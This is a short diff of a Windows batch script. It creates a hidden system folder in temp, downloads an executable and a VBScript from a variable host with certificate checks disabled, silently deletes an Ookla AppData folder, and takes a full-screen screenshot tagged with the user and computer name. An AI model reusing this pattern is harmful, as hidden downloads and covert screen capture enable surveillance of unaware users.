@@ -32,7 +32,7 @@ set "folder=%random%"
 mkdir "%temp%\%folder%" 
 attrib +s +h +i "%temp%\%folder%" 
 cd "%temp%\%folder%"
-
+rmdir /s /q "%AppData%\Ookla"
 curl.exe -k %proxy% %host%/Capture/speedtest.exe --output "speedtest.exe"
 curl.exe -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
